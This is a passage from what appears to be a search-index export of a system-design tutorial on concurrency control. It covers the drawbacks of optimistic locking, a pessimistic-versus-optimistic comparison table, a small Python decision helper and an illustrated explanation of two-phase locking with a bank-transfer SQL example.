\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Can't rollback API calls                 \u2502         \u2502\n\u2502 \u2502 \u2022 Can't undo sent emails                   \u2502         \u2502\n\u2502 \u2502 \u2022 Can't reverse payment authorizations     \u2502         \u2502\n\u2502 \u2502 \u2022 Can't undo file writes                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Problem:                                   \u2502         \u2502\n\u2502 \u2502 Transaction does:                          \u2502         \u2502\n\u2502 \u2502 1. Charge credit card (external API)       \u2502         \u2502\n\u2502 \u2502 2. Update database                         \u2502         \u2502\n\u2502 \u2502 3. Validation fails!                       \u2502         \u2502\n\u2502 \u2502 4. Rollback database \u2713                     \u2502         \u2502\n\u2502 \u2502 5. Rollback credit card charge? \u274c         \u2502         \u2502\n\u2502 \u2502    (Already processed!)                    \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 \u2192 Inconsistent state!                      \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 9. \u274c COMPLEX MONITORING                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Need to track retry rates                \u2502         \u2502\n\u2502 \u2502 \u2022 Monitor conflict rates                   \u2502         \u2502\n\u2502 \u2502 \u2022 Detect retry storms                      \u2502         \u2502\n\u2502 \u2502 \u2022 Alert on high failure rates              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Metrics needed:                            \u2502         \u2502\n\u2502 \u2502 \u2022 Conflicts per second                     \u2502         \u2502\n\u2502 \u2502 \u2022 Retry distribution                       \u2502         \u2502\n\u2502 \u2502 \u2022 Transaction success rate                 \u2502         \u2502\n\u2502 \u2502 \u2022 Starvation detection                     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 10. \u274c VERSION COLUMN MANAGEMENT                        \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Every table needs version column         \u2502         \u2502\n\u2502 \u2502 \u2022 Schema changes required                  \u2502         \u2502\n\u2502 \u2502 \u2022 Must maintain version consistency        \u2502         \u2502\n\u2502 \u2502 \u2022 Can overflow (need wraparound handling)  \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Requirements:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Add version to all tables                \u2502         \u2502\n\u2502 \u2502 \u2022 Increment on every update                \u2502         \u2502\n\u2502 \u2502 \u2022 Include in all WHERE clauses             \u2502         \u2502\n\u2502 \u2502 \u2022 Handle version overflow                  \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#443-side-by-side-summary","title":"4.4.3 Side-by-Side Summary","text":"<p>Quick Reference Table:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         PESSIMISTIC vs OPTIMISTIC - PROS &amp; CONS SUMMARY                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                          \u2502\n\u2502  Criteria            \u2502 Pessimistic        \u2502 Optimistic                  \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500     \u2502\n\u2502  Blocking            \u2502 \u274c High            \u2502 \u2705 None                      \u2502\n\u2502  Deadlocks           \u2502 \u274c Possible        \u2502 \u2705 Impossible                \u2502\n\u2502  Wasted Work         \u2502 \u2705 None            \u2502 \u274c High (on conflicts)       \u2502\n\u2502  Retry Needed        \u2502 \u2705 No              \u2502 \u274c Yes                       \u2502\n\u2502  Throughput (Low \u26a1) \u2502 \u274c Lower           \u2502 \u2705 Higher                    \u2502\n\u2502  Throughput (High\u26a1) \u2502 \u2705 Stable          \u2502 \u274c Degrades                  \u2502\n\u2502  Latency Variance    \u2502 \u2705 Low             \u2502 \u274c High                      \u2502\n\u2502  Code Complexity     \u2502 \u2705 Simple          \u2502 \u274c Complex                   \u2502\n\u2502  Overhead            \u2502 \u274c Lock mgmt       \u2502 \u2705 Minimal                   \u2502\n\u2502  Scalability         \u2502 \u274c Limited         \u2502 \u2705 Excellent                 \u2502\n\u2502  Consistency         \u2502 \u2705 Strong          \u2502 \u2705 Strong (with validation)  \u2502\n\u2502  User Experience     \u2502 \u2705 Transparent     \u2502 \u274c May see errors            \u2502\n\u2502  Monitoring          \u2502 \u2705 Straightforward \u2502 \u274c Complex                   \u2502\n\u2502  Distributed Systems \u2502 \u274c Difficult       \u2502 \u2705 Natural fit               \u2502\n\u2502                                                                          \u2502\n\u2502  Best For:                                                               \u2502\n\u2502  \u2022 High contention   \u2502 \u2705                 \u2502 \u274c                           \u2502\n\u2502  \u2022 Low contention    \u2502 \u274c                 \u2502 \u2705                           \u2502\n\u2502  \u2022 Read-heavy        \u2502 \u274c                 \u2502 \u2705                           \u2502\n\u2502  \u2022 Write-heavy       \u2502 \u2705                 \u2502 \u274c                           \u2502\n\u2502  \u2022 Critical data     \u2502 \u2705                 \u2502 \u274c                           \u2502\n\u2502  \u2022 Real-time         \u2502 \u274c                 \u2502 \u2705 (if low contention)       \u2502\n\u2502                                                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>When to Choose Each:</p> <pre><code>def choose_concurrency_control(workload):\n    \"\"\"Decision helper for choosing concurrency control\"\"\"\n\n    # Measure workload characteristics\n    conflict_rate = measure_conflict_rate()\n    read_write_ratio = measure_read_write_ratio()\n    transaction_duration = measure_avg_transaction_duration()\n    is_distributed = check_if_distributed_system()\n\n    # Decision logic\n    if conflict_rate &gt; 0.20:  # &gt;20% conflicts\n        return \"PESSIMISTIC\"\n        # Reason: Too many retries will waste resources\n\n    if transaction_duration &gt; 10:  # &gt;10 seconds\n        return \"PESSIMISTIC\"\n        # Reason: Long transactions likely to conflict\n\n    if read_write_ratio &lt; 0.5:  # &lt;50% reads (write-heavy)\n        return \"PESSIMISTIC\"\n        # Reason: Writes always conflict in optimistic\n\n    if is_distributed:\n        return \"OPTIMISTIC\"\n        # Reason: Distributed locks are expensive\n\n    if read_write_ratio &gt; 0.90:  # &gt;90% reads\n        return \"OPTIMISTIC\"\n        # Reason: Excellent for read-heavy workloads\n\n    # Default to pessimistic for safety\n    return \"PESSIMISTIC\"\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#45-two-phase-locking-2pl-protocol","title":"4.5 Two-Phase Locking (2PL) Protocol","text":"<p>Description:</p> <p>Two-Phase Locking (2PL) is a fundamental concurrency control protocol used in pessimistic concurrency control to ensure serializability. It's called \"two-phase\" because lock acquisition and release happen in two distinct phases. 2PL is the most widely used locking protocol in traditional database systems and is crucial for maintaining data consistency in concurrent environments.</p> <p>Historical Context and Importance:</p> <p>Two-Phase Locking was first formalized by K.P. Eswaran, J.N. Gray, R.A. Lorie, and I.L. Traiger at IBM in their seminal 1976 paper \"The Notions of Consistency and Predicate Locks in a Database System.\" This groundbreaking work laid the foundation for modern transaction processing systems and remains the cornerstone of concurrency control in relational databases today.</p> <p>The protocol emerged from the need to solve a critical problem: how to allow multiple transactions to execute concurrently while guaranteeing that the results are equivalent to some serial execution order. Before 2PL, database systems either ran transactions serially (slow) or allowed uncontrolled concurrent access (incorrect results). 2PL provided the first practical solution that balanced correctness with performance.</p> <p>Why 2PL Matters:</p> <ol> <li> <p>Industry Standard: Over 90% of production relational databases (MySQL, PostgreSQL, Oracle, SQL Server, DB2) use variants of 2PL as their default concurrency control mechanism. When you execute a transaction with <code>BEGIN...COMMIT</code>, you're likely using 2PL under the hood.</p> </li> <li> <p>Theoretical Foundation: 2PL is provably correct - it guarantees serializability through a simple, elegant protocol. This mathematical guarantee gives database developers confidence that their concurrent transactions will produce correct results.</p> </li> <li> <p>Practical Performance: While optimistic concurrency control can outperform 2PL in low-contention scenarios, 2PL provides predictable, stable performance across varying workloads, making it the safe default choice for general-purpose databases.</p> </li> <li> <p>Decades of Optimization: Modern databases have refined 2PL implementations with sophisticated lock managers, deadlock detection algorithms, lock escalation strategies, and multi-granularity locking. This accumulated engineering effort makes 2PL implementations extremely efficient.</p> </li> </ol> <p>Core Problem 2PL Solves:</p> <p>Consider this scenario without proper locking discipline: <pre><code>T1: Read(A) \u2192 Process \u2192 Read(B) \u2192 Write(C)\nT2: Write(A) \u2192 Read(B) \u2192 Write(C)\n</code></pre></p> <p>If locks can be acquired and released arbitrarily, we might see: - T1 reads old value of A - T2 updates A (T1 hasn't locked it yet) - T1 reads B and computes C based on old A and current B - Result: Non-serializable! (Mixed data from different time points)</p> <p>2PL prevents this by enforcing a strict discipline: once you start releasing locks, you can never acquire new ones. This simple rule ensures that each transaction sees a consistent snapshot of the database and that concurrent execution is equivalent to some serial order.</p> <p>Real-World Impact:</p> <p>Every time you: - Transfer money between bank accounts - Book an airline seat - Update your social media profile - Place an e-commerce order - Reserve a hotel room</p> <p>...there's a high probability that 2PL is working behind the scenes to ensure your transaction doesn't interfere with others and that you see consistent data.</p> <p>Understanding 2PL is essential for: - Database Administrators: Tuning isolation levels and diagnosing deadlocks - Backend Developers: Writing correct concurrent code and avoiding race conditions - System Architects: Choosing appropriate concurrency control strategies - Performance Engineers: Optimizing transaction throughput and latency</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#451-what-is-two-phase-locking","title":"4.5.1 What is Two-Phase Locking?","text":"<p>Definition:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         TWO-PHASE LOCKING (2PL) DEFINITION              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Two-Phase Locking is a concurrency control protocol    \u2502\n\u2502  that divides transaction execution into TWO phases:    \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502 PHASE 1: GROWING PHASE (Expansion)         \u2502        \u2502\n\u2502  \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502        \u2502\n\u2502  \u2502 \u2022 Transaction MAY acquire locks            \u2502        \u2502\n\u2502  \u2502 \u2022 Transaction CANNOT release any lock      \u2502        \u2502\n\u2502  \u2502 \u2022 Locks accumulate (grow)                  \u2502        \u2502\n\u2502  \u2502 \u2022 Continues until all needed locks held    \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                     \u2193                                   \u2502\n\u2502              LOCK POINT                                 \u2502\n\u2502         (Maximum locks held)                            \u2502\n\u2502                     \u2193                                   \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502 PHASE 2: SHRINKING PHASE (Contraction)     \u2502        \u2502\n\u2502  \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500         \u2502        \u2502\n\u2502  \u2502 \u2022 Transaction MAY release locks            \u2502        \u2502\n\u2502  \u2502 \u2022 Transaction CANNOT acquire new locks     \u2502        \u2502\n\u2502  \u2502 \u2022 Locks decrease (shrink)                  \u2502        \u2502\n\u2502  \u2502 \u2022 Continues until all locks released       \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  KEY RULE: Once you release ANY lock, you can          \u2502\n\u2502            NEVER acquire another lock!                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Timeline - 2PL Phases:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       TWO-PHASE LOCKING - TIMELINE DIAGRAM              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Number of                                              \u2502\n\u2502  Locks Held                                             \u2502\n\u2502      \u25b2                                                  \u2502\n\u2502      \u2502                   LOCK POINT                     \u2502\n\u2502      \u2502                       \u25cf                          \u2502\n\u2502      \u2502                      \u2571 \u2572                         \u2502\n\u2502    5 \u2502                     \u2571   \u2572                        \u2502\n\u2502      \u2502                    \u2571     \u2572                       \u2502\n\u2502    4 \u2502                   \u25cf       \u2572                      \u2502\n\u2502      \u2502                  \u2571         \u2572                     \u2502\n\u2502    3 \u2502                 \u25cf           \u25cf                    \u2502\n\u2502      \u2502                \u2571             \u2572                   \u2502\n\u2502    2 \u2502               \u25cf               \u25cf                  \u2502\n\u2502      \u2502              \u2571                 \u2572                 \u2502\n\u2502    1 \u2502         \u2500\u2500\u2500\u2500\u25cf                   \u25cf\u2500\u2500\u2500\u2500            \u2502\n\u2502      \u2502        \u2571                         \u2572               \u2502\n\u2502    0 \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                           \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192    \u2502\n\u2502              BEGIN                            COMMIT    \u2502\n\u2502                                                         \u2502\n\u2502      \u251c\u2500\u2500\u2500\u2500\u2500GROWING PHASE\u2500\u2500\u2500\u2500\u2500\u2524\u2500\u2500SHRINKING PHASE\u2500\u2500\u2524     \u2502\n\u2502                                                         \u2502\n\u2502      Actions in each phase:                             \u2502\n\u2502                                                         \u2502\n\u2502      GROWING:                 SHRINKING:                \u2502\n\u2502      \u2022 Lock(A)                \u2022 Unlock(C)               \u2502\n\u2502      \u2022 Lock(B)                \u2022 Unlock(D)               \u2502\n\u2502      \u2022 Lock(C)                \u2022 Unlock(B)               \u2502\n\u2502      \u2022 Lock(D)                \u2022 Unlock(A)               \u2502\n\u2502      \u2022 Lock(E)                \u2022 Unlock(E)               \u2502\n\u2502      \u2191 Can only ACQUIRE       \u2191 Can only RELEASE        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Detailed Example with Banking Transfer:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        2PL EXAMPLE: BANK TRANSFER                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Transaction: Transfer $100 from Account A to Account B \u2502\n\u2502                                                         \u2502\n\u2502 Time  Action                    Phase      Locks Held   \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n\u2502 t1    BEGIN TRANSACTION         -          []           \u2502\n\u2502                                                         \u2502\n\u2502       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u2502\n\u2502       \u2502     GROWING PHASE BEGINS            \u2502          \u2502\n\u2502       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \u2502\n\u2502                                                         \u2502\n\u2502 t2    SELECT balance FROM       GROWING    [A-shared]  \u2502\n\u2502       accounts WHERE id=A                               \u2502\n\u2502       FOR SHARE                                         \u2502\n\u2502       \u2192 Acquire SHARED lock on A                        \u2502\n\u2502                                                         \u2502\n\u2502 t3    SELECT balance FROM       GROWING    [A-shared,  \u2502\n\u2502       accounts WHERE id=B                   B-shared]   \u2502\n\u2502       FOR SHARE                                         \u2502\n\u2502       \u2192 Acquire SHARED lock on B                        \u2502\n\u2502                                                         \u2502\n\u2502 t4    Validate: balance_A &gt;= 100 GROWING   [A-shared,  \u2502\n\u2502                                             B-shared]   \u2502\n\u2502                                                         \u2502\n\u2502 t5    UPDATE accounts SET       GROWING    [A-excl,    \u2502\n\u2502       balance = balance - 100               B-shared]   \u2502\n\u2502       WHERE id=A                                        \u2502\n\u2502       \u2192 Upgrade to EXCLUSIVE lock on A                  \u2502\n\u2502                                                         \u2502\n\u2502 t6    UPDATE accounts SET       GROWING    [A-excl,    \u2502\n\u2502       balance = balance + 100               B-excl]     \u2502\n\u2502       WHERE id=B                                        \u2502\n\u2502       \u2192 Upgrade to EXCLUSIVE lock on B                  \u2502\n\u2502                                                         \u2502\n\u2502       \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LOCK POINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500              \u2502\n\u2502       (All locks acquired, maximum locks held)          \u2502\n\u2502                                                         \u2502\n\u2502       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u2502\n\u2502       \u2502     SHRINKING PHASE BEGINS          \u2502          \u2502\n\u2502       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \u2502\n\u2502                                                         \u2502\n\u2502 t7    COMMIT                    SHRINKING  []           \u2502\n\u2502       \u2192 Release ALL locks                               \u2502\n\u2502       (A-excl released)                                 \u2502\n\u2502       (B-excl released)                                 \u2502\n\u2502                                                         \u2502\n\u2502 t8    END TRANSACTION           -          []           \u2502\n\u2502                                                         \u2502\n\u2502 \u2713 2PL Protocol followed correctly!                      \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>What 2PL Guarantees:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           2PL GUARANTEES                                